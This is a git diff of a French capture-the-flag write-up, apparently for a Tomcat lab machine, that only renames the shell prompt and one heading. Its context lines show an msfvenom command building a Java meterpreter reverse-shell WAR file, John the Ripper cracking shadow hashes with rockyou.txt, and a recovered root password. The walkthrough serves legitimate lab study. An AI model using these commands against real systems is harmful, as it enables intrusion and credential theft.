@@ -56,7 +56,7 @@ Brute force avec une wordlist d’utilisateur et mot de passe par défaut
 Création d’un `reverse shell` en java
 
 ```
-┌─[parrot@parrot]─[~/Desktop]
+┌─[m0rph3u5@parrot]─[~/Desktop]
 └──╼ $msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f war > revshelll.war
 Payload size: 6214 bytes
 Final size of war file: 6214 bytes
@@ -181,7 +181,7 @@ tomcat:!:18854::::::
 Crack du hash de l’user `thales` & `root`
 
 ```
-┌─[parrot@parrot]─[~/Desktop]
+┌─[m0rph3u5@parrot]─[~/Desktop]
 └──╼ $john thales --wordlist=rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
@@ -224,7 +224,7 @@ root:ghost2000:18854:0:99999:7:::
 
 &nbsp;
 
-Cred trouver
+Identifiant trouver
 
 | User | Password |
 | --- | --- |
